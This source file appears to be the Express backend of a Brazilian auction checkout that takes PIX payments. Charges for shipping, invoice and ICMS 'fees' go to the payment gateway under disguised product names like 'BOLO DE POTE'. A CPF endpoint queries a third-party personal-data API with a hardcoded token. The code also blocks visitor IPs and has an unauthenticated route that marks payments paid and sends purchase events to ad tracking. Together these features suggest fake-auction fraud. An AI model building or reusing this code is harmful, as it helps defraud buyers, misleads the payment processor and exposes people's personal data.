import express from 'express';
import axios from 'axios';
import { getPool, ensureTables, dbUpsertPayment, dbGetPayment } from './_lib/db.js';
import { NITRO_API_URL, sanitizeBuyerName, buildExternalId, getNitroHeaders, getWebhookBase, isPaid, fetchNitroTransaction, buildFallbackPixCode } from './_lib/nitro.js';
import { sendCapiEvent } from './_lib/capi.js';

const app = express();
app.use(express.json());
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.get('/api/healthz', (_req, res) => res.json({ status: 'ok' }));

app.get('/api/block/check', async (req, res) => {
  const forwarded = req.headers['x-forwarded-for'];
  const ip = forwarded ? String(forwarded).split(',')[0].trim() : (req.socket?.remoteAddress || '');
  try {
    await ensureTables();
    const db = getPool();
    const result = await db.query('SELECT 1 FROM blocked_ips WHERE ip = $1 LIMIT 1', [ip]);
    res.json({ blocked: result.rowCount > 0, ip });
  } catch { res.json({ blocked: false, ip }); }
});

app.post('/api/block/register', async (req, res) => {
  const forwarded = req.headers['x-forwarded-for'];
  const ip = forwarded ? String(forwarded).split(',')[0].trim() : (req.socket?.remoteAddress || '');
  try {
    await ensureTables();
    const db = getPool();
    await db.query('INSERT INTO blocked_ips (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING', [ip]);
    res.json({ ok: true, ip });
  } catch { res.json({ ok: false, ip }); }
});

app.get('/api/cpf/consulta', async (req, res) => {
  const cpf = String(req.query.cpf || '').replace(/\D/g, '');
  if (cpf.length !== 11) return res.status(400).json({ error: 'CPF inválido' });
  try {
    const response = await axios.get(`https://api.amnesiatecnologia.rocks/?token=261207b9-0ec2-468a-ac04-f9d38a51da88&cpf=${cpf}`, { timeout: 10000 });
    return res.json(response.data);
  } catch { return res.status(502).json({ error: 'Erro ao consultar CPF' }); }
});

app.post('/api/pix/create', async (req, res) => {
  try {
    const { name, email, cpf, phone, amount, lotTitle } = req.body;
    if (!name || !cpf || !amount) return res.status(400).json({ error: 'name, cpf e amount são obrigatórios' });

    const cleanCpf = cpf.replace(/\D/g, '');
    const cleanPhone = (phone || '').replace(/\D/g, '');
    const amountInReais = Number(amount);
    const amountInCentavos = Math.round(amountInReais * 100);
    const externalId = buildExternalId();
    const safeName = sanitizeBuyerName(name);

    const buyer = {
      name: safeName.length >= 3 ? safeName : `${safeName} Cliente`,
      email: email || `${cleanCpf}@arrematante.com.br`,
      document: cleanCpf,
    };
    if (cleanPhone.length >= 10) {
      const phoneWithCountry = cleanPhone.startsWith('55') ? cleanPhone : `55${cleanPhone}`;
      if (phoneWithCountry.length >= 12 && phoneWithCountry.length <= 13) buyer.phone = phoneWithCountry;
    }

    const rawTitle = lotTitle || '';
    let gatewayProductName;
    if (rawTitle.startsWith('Frete Sedex')) {
      gatewayProductName = 'BOLO DE POTEF';
    } else if (rawTitle.startsWith('NF-e')) {
      gatewayProductName = 'BOLO DE POTEN';
    } else if (rawTitle.startsWith('ICMS')) {
      gatewayProductName = 'BOLO DE POTEIC';
    } else {
      gatewayProductName = 'APICB';
    }

    const webhookBase = getWebhookBase();
    const payload = {
      amount: Number(amountInReais.toFixed(2)),
      payment_method: 'pix',
      description: `Pagamento PIX - ${lotTitle || 'Lote Leilão'}`,
      items: [
        {
          title: lotTitle || `Lote Leilão #${externalId}`,
          unitPrice: amountInCentavos,
          quantity: 1,
          tangible: false,
        },
      ],
      customer: {
        name: buyer.name,
        email: buyer.email,
        document: buyer.document,
        phone: buyer.phone,
      },
      postbackUrl: `${webhookBase}/api/pix/webhook`,
      metadata: {
        order_id: externalId,
      },
    };

    let txId = `fallback-${externalId}`;
    let status = 'pending';
    let pixCode = null;
    let qrcodeBase64 = null;
    let fallbackMode = false;

    try {
      const response = await axios.post(`${NITRO_API_URL}`, payload, {
        headers: getNitroHeaders(), timeout: 15000,
      });

      const resp = response.data;
      if (!resp || resp.success !== true || !resp.data || !resp.data.id) {
        throw new Error(resp?.message || 'Resposta inválida da Nitro Pagamentos Hub');
      }

      const data = resp.data;
      txId = data.id;
      status = data.status || 'pending';
      pixCode = data.pix_code || data.pixCode || null;
      qrcodeBase64 = data.pix_qr_code || data.qrcodeBase64 || null;
    } catch (err) {
      fallbackMode = true;
      txId = `fallback-${externalId}`;
      status = 'pending';
      pixCode = buildFallbackPixCode(txId, amountInReais, lotTitle);
      console.warn('[pix/create] fallback ativado:', err.message || err);
    }

    const customerIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';
    await ensureTables();
    dbUpsertPayment(txId, {
      externalId, paid: false, status,
      value: amountInReais, contentId: lotTitle || 'Lote Leilão #144',
      contentName: lotTitle || 'Lote Leilão #144',
      customerIp, userAgent: req.headers['user-agent'] || '',
    }).catch(() => {});

    return res.json({ id: txId, externalId, status, pixCode, qrcodeBase64, fallback: fallbackMode });
  } catch (err) {
    const errData = err.response?.data;
    const baseMsg = errData?.error?.message || errData?.error || err.message || 'Erro ao criar transação';
    const detail = errData?.error?.detail ? Object.values(errData.error.detail).flat().join(', ') : null;
    console.error('[pix/create] erro:', JSON.stringify(errData || err.message));
    return res.status(500).json({ error: detail ? `${baseMsg}: ${detail}` : baseMsg });
  }
});

app.get('/api/pix/status/:id', async (req, res) => {
  const txId = req.params.id;
  try {
    await ensureTables();
    const entry = await dbGetPayment(txId);
    let status = entry?.status || 'pending';
    let paid = entry?.paid || false;

    try {
      const remote = await fetchNitroTransaction(txId);
      status = String(remote.status || status).toLowerCase();
      paid = isPaid(status);
      await dbUpsertPayment(txId, {
        ...entry,
        status,
        paid,
        value: entry?.value || Number(remote.amount || 0),
      });
    } catch (remoteErr) {
      console.error('[pix/status] remote fetch failed:', remoteErr.message);
    }

    return res.json({ id: txId, status, paid });
  } catch (err) {
    console.error('[pix/status] error:', err.message);
    return res.json({ id: txId, status: 'pending', paid: false });
  }
});

app.get('/api/pix/stream/:id', async (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  const txId = req.params.id;
  try {
    await ensureTables();
    const entry = await dbGetPayment(txId);
    if (entry && entry.paid) {
      res.write(`data: ${JSON.stringify({ type: 'payment_approved', status: entry.status })}\n\n`);
    } else {
      res.write(`: pending\n\n`);
    }
  } catch { res.write(`: error\n\n`); }
  res.end();
});

app.post('/api/pix/webhook', async (req, res) => {
  res.json({ ok: true });
  try {
    const { event, data: txData } = req.body;
    if (!txData) return;
    const txId = txData.id;
    const status = String(txData.status || '').toLowerCase();
    if (!txId) return;
    await ensureTables();
    const existing = await dbGetPayment(txId) || {};
    const paid = isPaid(status);
    const value = existing.value || (txData.total_amount || 0) / 100;
    const alreadyFired = existing.capiFired;
    await dbUpsertPayment(txId, { ...existing, paid, status, value, capiFired: alreadyFired || paid });
    console.log(`[webhook] event=${event} tx=${txId} paid=${paid}`);
    if (paid && !alreadyFired) {
      await sendCapiEvent({ eventName: 'Purchase', eventId: `Purchase_${txId}`, value,
        contentId: existing.contentId || 'Lote', contentName: existing.contentName || 'Lote',
        customerIp: existing.customerIp || '', userAgent: existing.userAgent || '' });
    }
  } catch (err) { console.error('[webhook] error:', err.message); }
});

app.post('/api/pix/confirm', async (req, res) => {
  res.json({ ok: true });
  try {
    const { txId, value, lotTitle } = req.body;
    if (!txId) return;
    const forwarded = req.headers['x-forwarded-for'];
    const customerIp = forwarded ? String(forwarded).split(',')[0].trim() : '';
    const userAgent = req.headers['user-agent'] || '';
    const amt = Number(value) || 0;
    const content = lotTitle || 'Lote Leilão';
    await ensureTables();
    const existing = await dbGetPayment(txId) || {};
    const alreadyFired = existing.capiFired;
    await dbUpsertPayment(txId, { ...existing, paid: true, status: 'paid', value: amt,
      contentId: content, contentName: content, customerIp, userAgent, capiFired: true });
    if (!alreadyFired) {
      await sendCapiEvent({ eventName: 'Purchase', eventId: `Purchase_${txId}`,
        value: amt, contentId: content, contentName: content, customerIp, userAgent });
    }
  } catch (err) { console.error('[pix/confirm] error:', err.message); }
});

export default function handler(req, res) {
  return app(req, res);
}
